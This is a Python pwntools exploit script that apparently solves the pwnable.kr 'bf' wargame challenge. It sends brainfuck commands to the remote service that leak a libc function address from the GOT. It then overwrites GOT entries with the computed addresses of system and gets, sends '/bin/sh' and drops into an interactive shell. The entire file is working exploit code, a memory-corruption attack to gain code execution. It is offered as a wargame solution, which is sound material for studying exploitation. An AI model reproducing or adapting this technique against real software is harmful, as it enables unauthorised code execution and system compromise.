from pwn import *
#ihciah@gmail.com
libc = ELF('bf_libc.so')
bf = remote('pwnable.kr', 9001)
bf.recvline_startswith('type')

#LEAK_PUTCHAR = ('<'*112+'.'+'.>'*4+'<'*4 + '>'*112,b'putchar')

leak_putchar = ('<'*(0x0804a0a0 - 0x0804a030) + '..>.>.>.<<<' + '>'*(0x0804a0a0 - 0x0804a030),b'putchar')
leak_memset  = ('<'*(0x0804a0a0 - 0x0804a02c) + '..>.>.>.<<<' + '>'*(0x0804a0a0 - 0x0804a02c),b'memset')
leak_fgets   = ('<'*(0x0804a0a0 - 0x0804a010) + '..>.>.>.<<<' + '>'*(0x0804a0a0 - 0x0804a010),b'fgets')

leaker = leak_memset

payload = leaker[0] + '<'*112 +',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.'
bf.sendline(payload)
bf.recv(1)
x=bf.recv(4)
print("x:")
print(x)
print("u32(x)")
print(u32(x))

jump=0x080484E0
bf.send(p32(jump))

system=u32(x)-libc.symbols[leaker[1]]+libc.symbols[b'system']
gets=u32(x)-libc.symbols[leaker[1]]+libc.symbols[b'gets']

bf.send(p32(system))
bf.send(p32(gets))
bf.sendline('/bin/sh\x00')
bf.interactive()

